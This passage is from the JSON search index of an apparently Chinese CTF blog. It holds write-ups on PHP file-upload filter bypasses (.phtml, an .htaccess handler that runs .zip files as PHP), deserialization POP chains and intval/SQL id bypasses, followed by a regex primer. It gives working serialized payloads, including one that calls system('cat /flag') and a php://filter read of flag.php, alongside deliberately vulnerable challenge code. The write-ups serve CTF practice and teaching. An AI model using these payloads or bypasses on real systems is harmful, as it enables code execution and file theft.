strrpos($uploaded_name,&#x27;.&#x27;) + 1); $uploaded_size = $_FILES[&#x27;uploaded&#x27;][&#x27;size&#x27;]; $uploaded_tmp = $_FILES[&#x27;uploaded&#x27;][&#x27;tmp_name&#x27;]; if(preg_match(&quot;/php|hta|ini/i&quot;, $uploaded_ext)) &#123; die(&quot;php是不行滴&quot;); &#125; else &#123; $content = file_get_contents($uploaded_tmp); move_uploaded_file($uploaded_tmp, $t_path); echo &quot;&#123;$t_path&#125; succesfully uploaded!&quot;; &#125;&#125;else&#123; die(&quot;不传🐎还想要f1ag?&quot;);&#125;?&gt; 改后缀名为phtml绕过 T2.htaccess 123&lt;FilesMatch &quot;zip&quot;&gt; SetHandler application/x-httpd-php &lt;/FilesMatch&gt; 可以把 .zip文件 当成.php解析","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"文件注入","slug":"文件注入","permalink":"http://example.com/tags/%E6%96%87%E4%BB%B6%E6%B3%A8%E5%85%A5/"}],"author":"arkcimi"},{"title":"pop_chain","slug":"pop-chain","date":"2023-11-12T06:52:32.000Z","updated":"2024-04-15T02:16:40.104Z","comments":true,"path":"pop-chain/","link":"","permalink":"http://example.com/pop-chain/","excerpt":"","text":"Pop Chain__sleep &amp; __wakeup || __serialize &amp; __unserialize当serialize一个对象时, 会自动调用对象内的sleep函数当unserialize一个对象时, 会自动调用对象内的wakeup函数 我们可以用urlencode函数把自己构造的实例对象通过url传回源代码例如: 12345678910111213141516class Class1&#123; public $aa = &quot;Aa&quot;; public $bb = &quot;Bb&quot;; public $cc = &quot;Cc&quot;; public function __wakeup() &#123; echo($this-&gt;aa); echo(&quot;&lt;br /&gt;&quot;); echo($this-&gt;bb); echo(&quot;&lt;br /&gt;&quot;); echo($this-&gt;cc); &#125;&#125;$in = $_GET[&#x27;in&#x27;];unserialize($in); 我们构造一个一样的类, 改一下变量的值 12345678class Class1&#123; public $aa = &quot;NewClass&quot;; public $bb = &quot;123456&quot;; public $cc = &quot; &quot;;&#125;$C1 = new Class1;echo urlencode(serialize($C1)); 把输出放入url 1/?in=O%3A6%3A%22Class1%22%3A3%3A%7Bs%3A2%3A%22aa%22%3Bs%3A8%3A%22NewClass%22%3Bs%3A2%3A%22bb%22%3Bs%3A6%3A%22123456%22%3Bs%3A2%3A%22cc%22%3Bs%3A1%3A%22+%22%3B%7D 得到: 123NewClass123456 可以看到, 变量的值变成了我们自己构造的对象 php魔术方法下面是其他常用的魔术方法 __construct &amp; __destruct这两个函数在类被创建和销毁时会被调用 12345678910111213141516171819class Class1&#123; public $a = &quot;Aa&quot;; var $b = &quot;Bb&quot;; public function __construct() &#123; echo(&quot;Construct Successfully&quot;); echo(&quot;&lt;br /&gt;&quot;); var_dump($this); &#125; public function __destruct() &#123; echo(&quot;Destruct Successfully&quot;); &#125;&#125;$C1 = new Class1;echo(&quot;&lt;br /&gt;&quot;);unset($C1); 输出为 123Construct Successfullyobject(Class1)#1 (2) &#123; [&quot;a&quot;]=&gt; string(2) &quot;Aa&quot; [&quot;b&quot;]=&gt; string(2) &quot;Bb&quot; &#125;Destruct Successfully 如果类中同时定义了 __serialize() 和 __sleep() 两个魔术方法，则只有 __serialize() 方法会被调用。 __sleep() 方法会被忽略掉。如果对象实现了 Serializable 接口，接口的 serialize() 方法会被忽略，做为代替类中的 __serialize() 方法会被调用 __get &amp; __set__get($property) : 当调用一个未定义&#x2F;private的属性时，此方法会被触发，传递的参数是被访问的属性名__set($property, $value) : 给一个未定义&#x2F;private的属性赋值时，此方法会被触发，传递的参数是被设置的属性名和值(这里的没有声明包括当使用对象调用时，访问控制为proteced,private的属性 (即没有权限访问的属性)) 12345678910111213141516171819202122class Class1&#123; public $a=&quot;Aa&quot;; public function __get($_a) &#123; echo(&quot;Can&#x27;t get &quot;.$_a); &#125; public function __set($_a, $_b) &#123; echo(&quot;Can&#x27;t set &quot;.$_a.&quot; = &quot;.$_b); &#125;&#125;$C1=new Class1();echo($C1-&gt;b);echo(&quot;&lt;br /&gt;&quot;);$C1-&gt;a=5;echo($C1-&gt;a);echo(&quot;&lt;br /&gt;&quot;);$C1-&gt;b = 2; 输出为 123Can&#x27;t get b5Can&#x27;t set b = 2 __invoke当尝试以调用函数的方式调用一个对象时，__invoke 方法会被自动调用 1234567891011class Class1&#123; public function __invoke() &#123; echo(&quot;Can&#x27;t use as a function&quot;); &#125;&#125;$C1 = new Class1;$C1(); 输出为 1Can&#x27;t use as a function __toString在将一个对象转化成字符串时自动调用，比如使用echo打印对象时必须有返回值(返回一个字符串) 1234567891011class Class1&#123; public function __toString() &#123; return &quot;It&#x27;s not a String&quot;; &#125;&#125;$C1 = new Class1;echo($C1); 输出为 1It&#x27;s not a String __call用的方法不存在时, __call 会运行 123456789101112131415class Class1&#123; public function __call(string $function_name, array $arguments) &#123; echo &quot;你所调用的函数：&quot; . $funName . &quot;(参数：&quot; ; // 输出调用不存在的方法名 print_r($arguments); // 输出调用不存在的方法时的参数列表 echo &quot;)不存在！\\n&quot;; // 结束换行 &#125;&#125;$C1 = new Class1;$C1-&gt;hello(&quot;AR1&quot;);$C1-&gt;again(&quot;AR1&quot;, &quot;AR2&quot;); 12345678910111213你所调用的函数：hello(参数：Array( [0] =&gt; AR1))不存在！你所调用的函数：again(参数：Array( [0] =&gt; AR1 [1] =&gt; AR2))不存在！ php的变量都是弱类型的, 也就是说, 我们可以把一个变量赋值为一个类, 这样就构成了pop chain; pop chainT112345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152//flag is in flag.phpclass Modifier &#123; protected $var; public function append($value) &#123; include($value); //1. 目标 &#125; public function __invoke() &#123; $this-&gt;append($this-&gt;var); //2. 调用目标函数 &#125;&#125; class Show&#123; public $source; public $str; public function __construct($file=&#x27;index.php&#x27;)&#123; $this-&gt;source = $file; echo &#x27;Welcome to &#x27;.$this-&gt;source.&quot;&lt;br&gt;&quot;; //5-&gt;4. 把$source当成字符串, $source应为4中的$this &#125; public function __toString()&#123; return $this-&gt;str-&gt;source; //4-&gt;3. $str中不存在$source, 把$str赋值为Test类 &#125; public function __wakeup()&#123; if(preg_match(&quot;/gopher|http|file|ftp|https|dict|\\.\\./i&quot;, $this-&gt;source)) &#123; echo &quot;hacker&quot;; $this-&gt;source = &quot;index.php&quot;; &#125; &#125;&#125; class Test&#123; public $p; public function __construct()&#123; $this-&gt;p = array(); &#125; public function __get($key)&#123; //3. 调用不存在的变量 $function = $this-&gt;p; //3. $p应赋值为Modifier类 return $function(); //3-&gt;2. 把类当成函数用 &#125;&#125; if(isset($_GET[&#x27;pop&#x27;]))&#123; @unserialize($_GET[&#x27;pop&#x27;]); &#125;else&#123; $a=new Show; highlight_file(__FILE__);&#125; 从后往前推 12345678910111213141516171819202122class Modifier &#123; protected $var=&#x27;php://filter/read=convert.base64-encode/resource=flag.php&#x27;;&#125;class Show&#123; public $source; public $str;&#125;class Test&#123; public $p;&#125;$a = new show();$b = new show();$c = new test();$d = new Modifier();$a-&gt;source = $b; //5.$b-&gt;str = $c; //4.$c-&gt;p = $d; //3.echo urlencode(serialize($a)); 得出以下, 输入url中即可 1O%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BO%3A4%3A%22Show%22%3A2%3A%7Bs%3A6%3A%22source%22%3BN%3Bs%3A3%3A%22str%22%3BO%3A4%3A%22Test%22%3A1%3A%7Bs%3A1%3A%22p%22%3BO%3A8%3A%22Modifier%22%3A1%3A%7Bs%3A6%3A%22%00%2A%00var%22%3Bs%3A57%3A%22php%3A%2F%2Ffilter%2Fread%3Dconvert.base64-encode%2Fresource%3Dflag.php%22%3B%7D%7D%7Ds%3A3%3A%22str%22%3BN%3B%7D T2123456789101112131415161718192021222324252627282930313233343536373839class syc&#123; public $cuit; public function __destruct() //destruct会自行运行 &#123; echo(&quot;action!&lt;br&gt;&quot;); $function=$this-&gt;cuit; //$cuit = lover Class return $function(); &#125;&#125;class lover&#123; public $yxx; public $QW; public function __invoke() &#123; echo(&quot;invoke!&lt;br&gt;&quot;); return $this-&gt;yxx-&gt;QW; //$yxx = web Class &#125;&#125;class web&#123; public $eva1; public $interesting; public function __get($var) &#123; echo(&quot;get!&lt;br&gt;&quot;); $eva1=$this-&gt;eva1; $eva1($this-&gt;interesting); //0. target &#125;&#125;if (isset($_POST[&#x27;url&#x27;])) &#123; unserialize($_POST[&#x27;url&#x27;]);&#125; 123456789101112131415161718192021222324252627class syc&#123; public $cuit;&#125;class lover&#123; public $yxx; public $QW;&#125;class web&#123; public $eva1; public $interesting;&#125;$we = new web();$lo = new lover();$sy = new syc();$we-&gt;eva1 = &quot;system&quot;;$we-&gt;interesting = &quot;cat /flag&quot;;$lo-&gt;yxx = $we;$sy-&gt;cuit = $lo;echo urlencode(serialize($sy)); 得到 1O%3A3%3A%22syc%22%3A1%3A%7Bs%3A4%3A%22cuit%22%3BO%3A5%3A%22lover%22%3A2%3A%7Bs%3A3%3A%22yxx%22%3BO%3A3%3A%22web%22%3A2%3A%7Bs%3A4%3A%22eva1%22%3Bs%3A6%3A%22system%22%3Bs%3A11%3A%22interesting%22%3Bs%3A9%3A%22cat+%2Fflag%22%3B%7Ds%3A2%3A%22QW%22%3BN%3B%7D%7D T3123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081class izayoishiki&#123; public $giveme; public $bbb; public $name; public $position; public function __construct() &#123; $this-&gt;giveme = &#x27;750ti&#x27;; $this-&gt;bbb = &#x27;Error&#x27;; &#125; public function __toString() //5-&gt;4. $iz1 &#123; return $this-&gt;bbb-&gt;aaa; //4. $iz1-&gt;bbb应赋值为agirlfriend类 $ag(绕回它自己了) &#125; public function z3r0() &#123; if($this-&gt;name!=&#x27;izayoishiki&#x27;||$this-&gt;giveme!=&#x27;4090ti&#x27;||$this-&gt;position!=&#x27;reverse&#x27;)//31. $iz2(自行赋值) &#123; echo &quot;nonono!&lt;br/&gt;&quot;; return false; &#125; else &#123; echo &quot;yesyesyes!&lt;br/&gt;&quot;; //31. return true; &#125; &#125;&#125;class wants&#123; public $girl; public $vav; public function __construct() &#123; $this-&gt;girl = &#x27;750ti&#x27;; &#125; public function qwq() //22-&gt;1. &#123; if($this-&gt;girl === &#x27;None&#x27;) //21-&gt;1. (需要自行赋值)$wa-&gt;girl=&#x27;None&#x27; &#123; echo &quot;Oh... I am so sorry to hear that&lt;br/&gt;&quot;; echo &quot;But you now can do something!&lt;br/&gt;&quot;; echo (&quot;win!&quot;); //1. 目标 &#125; &#125; public function __invoke() //32-&gt;22.$wa &#123; if($this-&gt;vav-&gt;z3r0()) //31-&gt;22. $wa-&gt;vav 应赋值为izayoishiki类 $iz2 &#123; $this-&gt;qwq(); //22. &#125; else &#123; echo &quot;So sad...&lt;br/&gt;&quot;; &#125; &#125;&#125;class agirlfriend&#123; private $effort; public $friend; public function __construct() &#123; $this-&gt;effort = array(); &#125; public function __get($key) //4-&gt;32. $ag &#123; $function = $this-&gt;effort; //32. $ag-&gt;effort应赋值为wants类 $wa return $function(); &#125; public function __wakeup() //6. $ag 开始 &#123; echo $this-&gt;friend; //5. $ag-&gt;friend应赋值为izayoishiki类 $iz1 &#125;&#125;if(isset($_GET[&#x27;ser&#x27;]))&#123; unserialize($_GET[&#x27;ser&#x27;]);&#125; 由此, 依序赋值 1234567891011121314151617181920212223242526272829303132class izayoishiki&#123; public $giveme; public $bbb; public $name; public $position;&#125;class wants&#123; public $girl; public $vav;&#125;class agirlfriend&#123; private $effort; public $friend;&#125;$iz1 = new izayoishiki();$iz2 = new izayoishiki();$wa = new wants();$ag = new agirlfriend();$wa-&gt;girl=&#x27;None&#x27;;$wa-&gt;name = &#x27;izayoishiki&#x27;;$wa-&gt;giveme = &#x27;4090ti&#x27;;$wa-&gt;position = &#x27;reverse&#x27;;$iz1-&gt;bbb = $ag;$ag-&gt;friend = $iz1;$ag-&gt;effort = $wa;$wa-&gt;vav = $iz2;echo urlencode(serilize($ag)); 但是, 我们发现$effort 是 private的, 无法访问;因此, 只能在类内部更改; __wants以及后面的$iz2都要修改 12345678910111213141516171819202122232425262728293031323334353637383940class izayoishiki&#123; public $giveme; public $bbb; public $name; public $position; public function __construct() &#123; $this-&gt;name = &#x27;izayoishiki&#x27;; $this-&gt;giveme = &#x27;4090ti&#x27;; $this-&gt;position = &#x27;reverse&#x27;; &#125;&#125;class wants&#123; public $girl; public $vav; public function __construct() &#123; $this-&gt;girl=&#x27;None&#x27;; $this-&gt;vav = new izayoishiki(); &#125;&#125;class agirlfriend&#123; private $effort; public $friend; public function __construct() &#123; $this-&gt;effort = new wants(); &#125;&#125;$iz1 = new izayoishiki();$iz2 = new izayoishiki();$ag = new agirlfriend();$iz1-&gt;bbb = $ag;$ag-&gt;friend = $iz1;echo urlencode(serialize($ag)); 我们得到 1O%3A11%3A%22agirlfriend%22%3A2%3A%7Bs%3A19%3A%22%00agirlfriend%00effort%22%3BO%3A5%3A%22wants%22%3A2%3A%7Bs%3A4%3A%22girl%22%3Bs%3A4%3A%22None%22%3Bs%3A3%3A%22vav%22%3BO%3A11%3A%22izayoishiki%22%3A4%3A%7Bs%3A6%3A%22giveme%22%3Bs%3A6%3A%224090ti%22%3Bs%3A3%3A%22bbb%22%3BN%3Bs%3A4%3A%22name%22%3Bs%3A11%3A%22izayoishiki%22%3Bs%3A8%3A%22position%22%3Bs%3A7%3A%22reverse%22%3B%7D%7Ds%3A6%3A%22friend%22%3BO%3A11%3A%22izayoishiki%22%3A4%3A%7Bs%3A6%3A%22giveme%22%3Bs%3A6%3A%224090ti%22%3Bs%3A3%3A%22bbb%22%3Br%3A1%3Bs%3A4%3A%22name%22%3Bs%3A11%3A%22izayoishiki%22%3Bs%3A8%3A%22position%22%3Bs%3A7%3A%22reverse%22%3B%7D%7D T4123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124include(&#x27;key.php&#x27;);include(&#x27;waf.php&#x27;);class Me &#123; public $qwe; public $bro; public $secret; public function __wakeup() &#123; echo(&quot;进来啦&lt;br&gt;&quot;); $characters = &#x27;abcdefghijklmnopqrstuvwxyz0123456789&#x27;; $randomString = substr(str_shuffle($characters), 0, 6); $this-&gt;secret=$randomString; if($this-&gt;bro===$this-&gt;secret)&#123; $bb = $this-&gt;qwe; return $bb(); &#125; else&#123; echo(&quot;错了哥们,再试试吧&lt;br&gt;&quot;); &#125; &#125;&#125;class her&#123; private $hername; private $key; public $asd; public function __invoke() &#123; echo(&quot;好累，好想睡一觉啊&lt;br&gt;&quot;); serialize($this-&gt;asd); &#125; public function find() &#123; //1-&gt;0. echo(&quot;你能找到加密用的key和她的名字吗？qwq&lt;br&gt;&quot;); if (encode($this-&gt;hername,$this-&gt;key) === &#x27;vxvx&#x27;) &#123; echo(&quot;解密成功！&lt;br&gt;&quot;); $file=$_GET[&#x27;file&#x27;]; if (isset($file) &amp;&amp; (file_get_contents($file,&#x27;r&#x27;) === &quot;loveyou&quot;)) &#123; echo(&quot;快点的，急急急！！！&lt;br&gt;&quot;); echo new $_POST[&#x27;ctf&#x27;]($_GET[&#x27;fun&#x27;]); //0.target &#125; else&#123; echo(&quot;真的只差一步了！&lt;br&gt;&quot;); &#125; &#125; else&#123; echo(&quot;兄弟怎么搞的？&lt;br&gt;&quot;); &#125; &#125;&#125;class important&#123; public $power; public function __sleep() &#123; echo(&quot;睡饱了，接着找！&lt;br&gt;&quot;); return $this-&gt;power-&gt;seeyou; &#125;&#125;class useless &#123; private $seeyou; public $QW; public $YXX; public function __construct($seeyou) &#123; $this-&gt;seeyou = $seeyou; &#125; public function __destruct() &#123; $characters = &#x27;0123456789&#x27;; $random = substr(str_shuffle($characters), 0, 6); if (!preg_match(&#x27;/key\\.php\\/*$/i&#x27;, $_SERVER[&#x27;REQUEST_URI&#x27;]))&#123; if((strlen($this-&gt;QW))&lt;80 &amp;&amp; strlen($this-&gt;YXX)&lt;80)&#123; $bool=!is_array($this-&gt;QW)&amp;&amp;!is_array($this-&gt;YXX)&amp;&amp;(md5($this-&gt;QW) === md5($this-&gt;YXX)) &amp;&amp; ($this-&gt;QW != $this-&gt;YXX) and $random===&#x27;newbee&#x27;; if($bool)&#123; echo(&quot;快拿到我的小秘密了&lt;br&gt;&quot;); $a = isset($_GET[&#x27;a&#x27;])? $_GET[&#x27;a&#x27;]: &quot;&quot; ; if(!preg_match(&#x27;/HTTP/i&#x27;, $a))&#123; echo (basename($_SERVER[$a])); echo (&#x27;&lt;br&gt;&#x27;); if(basename($_SERVER[$a])===&#x27;key.php&#x27;)&#123; echo(&quot;找到了！但好像不能直接使用，怎么办，我好想她&lt;br&gt;&quot;); $file = &quot;key.php&quot;; readfile($file); &#125; &#125; else&#123; echo(&quot;你别这样，她会生气的┭┮﹏┭┮&quot;); &#125; &#125; &#125; else&#123; echo(&quot;就这点能耐？怎么帮我找到她(╥╯^╰╥)&lt;br&gt;&quot;); &#125; &#125; &#125; public function __get($good) &#123; echo &quot;you are good,你快找到我爱的那个她了&lt;br&gt;&quot;; $zhui = $this-&gt;$good; $zhui[$good](); &#125;&#125;if (isset($_GET[&#x27;user&#x27;])) &#123; $user = $_GET[&#x27;user&#x27;]; if (!preg_match(&quot;/^[Oa]:[\\d]+/i&quot;, $user)) &#123; unserialize($user); &#125; else &#123; echo(&quot;不是吧，第一层都绕不过去？？？&lt;br&gt;&quot;); &#125;&#125;else &#123; echo(&quot;快帮我找找她！&lt;br&gt;&quot;);&#125;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"pop chain","slug":"pop-chain","permalink":"http://example.com/tags/pop-chain/"},{"name":"php魔术方法","slug":"php魔术方法","permalink":"http://example.com/tags/php%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95/"}],"author":"arkcimi"},{"title":"intval绕过","slug":"intval绕过","date":"2023-11-10T01:16:14.000Z","updated":"2024-03-03T07:53:03.950Z","comments":true,"path":"intval绕过/","link":"","permalink":"http://example.com/intval%E7%BB%95%E8%BF%87/","excerpt":"","text":"intval 绕过intval 基础整数12345678var_dump(intval(1010)); //int(1010)var_dump(intval(1010, 0)); //int(1010)var_dump(intval(1010, 8)); //int(1010)var_dump(intval(1010, 10)); //int(1010)var_dump(intval(1010, 16)); //int(1010)var_dump(intval(01010, 16)); //int(520)var_dump(intval(0x1010, 8)); //int(4112)//由此可见整数的输出与第二个参数无关 字符串1234567891011121314151617181920212223var_dump(intval(&quot;1010&quot;)); //int(1010)var_dump(intval(&quot;1010&quot;, 0)); //int(1010)var_dump(intval(&quot;1010&quot;, 8)); //int(520)var_dump(intval(&quot;1010&quot;, 10)); //int(1010)var_dump(intval(&quot;1010&quot;, 16)); //int(4112)//字符串只识别字母前的数字var_dump(intval(&quot;123abc&quot;)); //int(123)var_dump(intval(&quot;123abc&quot;, 8)); //int(83)var_dump(intval(&quot;123abc&quot;, 16)); //int(1194684)(默认十进制)var_dump(intval(&quot;&#x27;123abc&#x27;&quot;)); //int(0)var_dump(intval(&quot;0x5f5e800&quot;)); //int(0)var_dump(intval(&quot;0123abc&quot;)); //int(123)var_dump(intval(&quot;0x123abc&quot;)); //int(0)//无法识别科学记数法var_dump(intval(&quot;1e10&quot;)); //int(1)var_dump(intval(&quot;1e10&quot;, 10)); //int(1)var_dump(intval(&quot;1e10&quot;, 16)); //int(7696)var_dump(intval(&quot;1e10&quot;, 8)); //int(1)var_dump(intval(&quot;1e10g10&quot;, 16));//int(7696) 实数1234var_dump(intval(32.2)); //int(32)var_dump(intval(32.2, 10)); //int(32)var_dump(intval(32.2, 8)); //int(32)var_dump(intval(32.2, 16)); //int(32) 数组1234567//数组为空返回0, 否则返回1$a=array(1, 2);$b=array(3, 4, 5);$c=array();var_dump(intval($a)); //int(1)var_dump(intval($b)); //int(1)var_dump(intval($c)); //int(0) 1234567//GET传参会自动加引号三种数组写法：$a[]=1;$a=array(1,2);$a=[1,2];//传参时用第一种 常用绕过T11if (intval($_GET[&#x27;lover&#x27;]) &lt; 2023 &amp;&amp; intval($_GET[&#x27;lover&#x27;] + 1) &gt; 2024) 可以用科学计数法绕过 1234var_dump(intval(1e10)); //int(1410065408)var_dump(intval(&quot;1e10&quot;)); //int(1)var_dump(intval(1e10+1)); //int(1410065409)var_dump(intval(&quot;1e10&quot;+1)); //int(1410065409)(&#x27;+&#x27;可以把字符串转为整数) T2tips: flag in id &#x3D; 1000 12345678910111213141516171819$id=$_GET[&#x27;id&#x27;];if(intval($id) &gt; 999)&#123; die(&quot;id error&quot;);&#125;else&#123; $sql = &quot;select * from article where id = $id order by id limit 1 &quot;; echo &quot;执行的sql为：$sql&lt;br&gt;&quot;; $result = $conn-&gt;query($sql); //判断有没有查询结果 if ($result-&gt;num_rows &gt; 0) &#123; while($row = $result-&gt;fetch_assoc()) &#123; echo &quot;id: &quot; . $row[&quot;id&quot;]. &quot; - title: &quot; . $row[&quot;title&quot;]. &quot; &lt;br&gt;&lt;hr&gt;&quot; . $row[&quot;content&quot;]. &quot;&lt;br&gt;&quot;; &#125; &#125;$conn-&gt;close();&#125; 很明显, 这里要让$id&#x3D;1000, 但intval($id) &lt;&#x3D; 999. 1GET传参会自动加引号, 即/?id=&#x27;abc&#x27;, $_GET[&#x27;id&#x27;]=&quot;&#x27;abc&#x27;&quot; 12345678/?id=&#x27;1000&#x27; //我们可以利用这个特性, 让$id第一位为&#x27;; intval(&quot;&#x27;1000&#x27;&quot;)=0 &lt;= 999/?id=999%2B1/?id=125*8/?id=~~1000/?id=0x3E8/?id=125&lt;&lt;3 //1111101&lt;&lt;3 = 1111101000 = 1000/?id=680|320 //按位或/?id=992^8 //按位异或 T3弱类型 such as &lt;?php show_source(__FILE__); include(&quot;config.php&quot;); $a=@$_GET[&#39;a&#39;]; $b=@$_GET[&#39;b&#39;]; if($a==0 and $a)&#123; echo $flag1; &#125; if(is_numeric($b))&#123; exit(); &#125; if($b&gt;1234)&#123; echo $flag2; &#125; //a=0a //b=1235a ?&gt;","categories":[{"name":"CTF","slug":"CTF","permalink":"http://example.com/categories/CTF/"}],"tags":[{"name":"ctf","slug":"ctf","permalink":"http://example.com/tags/ctf/"},{"name":"intval","slug":"intval","permalink":"http://example.com/tags/intval/"}],"author":"arkcimi"},{"title":"Regular_Expression","slug":"正则表达式Regular_Expression","date":"2023-11-07T05:37:14.000Z","updated":"2024-05-05T15:47:10.987Z","comments":true,"path":"正则表达式Regular_Expression/","link":"","permalink":"http://example.com/%E6%AD%A3%E5%88%99%E8%A1%A8%E8%BE%BE%E5%BC%8FRegular_Expression/","excerpt":"","text":"Regular Expression | 正则表达式基本元素字符如 : a, 1…… . : 任意字符(除了换行符) \\d : 任意数字 \\w : 任意字母 \\s : 任意的空白符 [] : 内部或 如: [123]: 1 or 2 or 3; [a-z]: a~z任一字符…… ; () : 块 数量 * : 0次以上 + : 1次以上 ? : 0 or 1次 {n} : n次 {n, } : n次以上 {n, m} : n~m次 语法 | : 或 ^ ：匹配字符串的开始 $ ：匹配字符串的结束 i : 不区分大小写 s : 可以换行 零宽断言 (?&#x3D;任意字符) : (正前瞻) (?&lt;&#x3D;任意字符) : (正后顾) (?!任意字符) : (负前瞻) (?&lt;!任意字符) : (负后顾) 如 &quot;\\w*(?=1)&quot; 匹配 &#39;qw1er2&#39;, 得qw java 实例java Matcher匹配 1234567891011121314public class Main &#123; public static void main(String[] args) &#123; String reg = &quot;(0\\\\d&#123;2&#125;)-(\\\\d&#123;8&#125;)&quot;; String test = &quot;020-12345678&quot;; Pattern pattern = Pattern.compile(reg); Matcher mc = pattern.matcher(test); mc.find(); for(int i = 0; i &lt;= mc.groupCount(); i++) &#123; System.out.println(mc.group(i)); &#125; &#125;&#125; 输出为 123020-1234567802012345678 捕获组 反向引用()中为捕获组, (?:)非捕获组 例子如上捕获组默认命名为0, 1, 2……整个捕获为0 也可以自己命名“(?&lt;name&gt;exp)”则用?.group(&quot;name&quot;)来引用 \\i 即表示第i组 1234567891011121314public class Main &#123; public static void main(String[] args) &#123; String reg = &quot;(\\\\w)\\\\1+.*(\\\\w)\\\\2+.*(\\\\w)\\\\3+&quot;; String test = &quot;aaabbcdddef&quot;; Pattern pattern = Pattern.compile(reg); Matcher mc = pattern.matcher(test); mc.find(); for(int i = 0; i &lt;= mc.groupCount(); i++) &#123; System.out.println(mc.group(i)); &#125; &#125;&#125; 匹配结果为 1234aaabbcdddabd 贪婪和非贪婪贪婪如__”exp… \\d{2,3}5 exp…”__ 会先匹配3个数字, 若下一个是5, 则继续匹配; 若不是5, 则会回溯, 匹配2个数字, 再检测是否匹配5. 若匹配失败, 整个表达式匹配失败. 非贪婪在数量表达式后面加?如 : *? , {n, m}?(先匹配n个, 再增加) 递归?R 能代表整个正则表达式 先来一个简单的 1&quot;/^a(?R)?z$/&quot; 如此就能匹配: a(?R)?z, aa(?R)?zz, aaa(?R)?zzz, … 再例 1&quot;/[^\\s\\(\\)]+?\\((?R)?\\)/&quot; 前面的[]内除了 空格, (, ) 都能匹配, 后面是一对括号以及里面的递归 那么, 类似 aaa(bbb(ccc())) 的字符串就都能匹配 常用表达式感谢@小山沟里的程序猿 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374一、校验数字的表达式 1 数字：^[0-9]*$ 2 n位的数字：^\\d&#123;n&#125;$ 3 至少n位的数字：^\\d&#123;n,&#125;$ 4 m-n位的数字：^\\d&#123;m,n&#125;$ 5 零和非零开头的数字：^(0|[1-9][0-9]*)$ 6 非零开头的最多带两位小数的数字：^([1-9][0-9]*)+(.[0-9]&#123;1,2&#125;)?$ 7 带1-2位小数的正数或负数：^(\\-)?\\d+(\\.\\d&#123;1,2&#125;)?$ 8 正数、负数、和小数：^(\\-|\\+)?\\d+(\\.\\d+)?$ 9 有两位小数的正实数：^[0-9]+(.[0-9]&#123;2&#125;)?$ 10 有1~3位小数的正实数：^[0-9]+(.[0-9]&#123;1,3&#125;)?$ 11 非零的正整数：^[1-9]\\d*$ 或 ^([1-9][0-9]*)&#123;1,3&#125;$ 或 ^\\+?[1-9][0-9]*$ 12 非零的负整数：^\\-[1-9][]0-9*$ 或 ^-[1-9]\\d*$ 13 非负整数：^\\d+$ 或 ^[1-9]\\d*|0$ 14 非正整数：^-[1-9]\\d*|0$ 或 ^((-\\d+)|(0+))$ 15 非负浮点数：^\\d+(\\.\\d+)?$ 或 ^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0$ 16 非正浮点数：^((-\\d+(\\.\\d+)?)|(0+(\\.0+)?))$ 或 ^(-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*))|0?\\.0+|0$ 17 正浮点数：^[1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*$ 或 ^(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*))$ 18 负浮点数：^-([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*)$ 或 ^(-(([0-9]+\\.[0-9]*[1-9][0-9]*)|([0-9]*[1-9][0-9]*\\.[0-9]+)|([0-9]*[1-9][0-9]*)))$ 19 浮点数：^(-?\\d+)(\\.\\d+)?$ 或 ^-?([1-9]\\d*\\.\\d*|0\\.\\d*[1-9]\\d*|0?\\.0+|0)$ 二、校验字符的表达式 1 汉字：^[\\u4e00-\\u9fa5]&#123;0,&#125;$ 2 英文和数字：^[A-Za-z0-9]+$ 或 ^[A-Za-z0-9]&#123;4,40&#125;$ 3 长度为3-20的所有字符：^.&#123;3,20&#125;$ 4 由26个英文字母组成的字符串：^[A-Za-z]+$ 5 由26个大写英文字母组成的字符串：^[A-Z]+$ 6 由26个小写英文字母组成的字符串：^[a-z]+$ 7 由数字和26个英文字母组成的字符串：^[A-Za-z0-9]+$ 8 由数字、26个英文字母或者下划线组成的字符串：^\\w+$ 或 ^\\w&#123;3,20&#125;$ 9 中文、英文、数字包括下划线：^[\\u4E00-\\u9FA5A-Za-z0-9_]+$ 10 中文、英文、数字但不包括下划线等符号：^[\\u4E00-\\u9FA5A-Za-z0-9]+$ 或 ^[\\u4E00-\\u9FA5A-Za-z0-9]&#123;2,20&#125;$ 11 可以输入含有^%&amp;&#x27;,;=?$\\&quot;等字符：[^%&amp;&#x27;,;=?$\\x22]+ 12 禁止输入含有~的字符：[^~\\x22]+ 三、特殊需求表达式 1 Email地址：^\\w+([-+.]\\w+)*@\\w+([-.]\\w+)*\\.\\w+([-.]\\w+)*$ 2 域名：[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;(/.[a-zA-Z0-9][-a-zA-Z0-9]&#123;0,62&#125;)+/.? 3 InternetURL：[a-zA-z]+://[^\\s]* 或 ^http://([\\w-]+\\.)+[\\w-]+(/[\\w-./?%&amp;=]*)?$ 4 手机号码：^(13[0-9]|14[5|7]|15[0|1|2|3|5|6|7|8|9]|18[0|1|2|3|5|6|7|8|9])\\d&#123;8&#125;$ 5 电话号码(&quot;XXX-XXXXXXX&quot;、&quot;XXXX-XXXXXXXX&quot;、&quot;XXX-XXXXXXX&quot;、&quot;XXX-XXXXXXXX&quot;、&quot;XXXXXXX&quot;和&quot;XXXXXXXX&quot;)：^(\\(\\d&#123;3,4&#125;-)|\\d&#123;3.4&#125;-)?\\d&#123;7,8&#125;$ 6 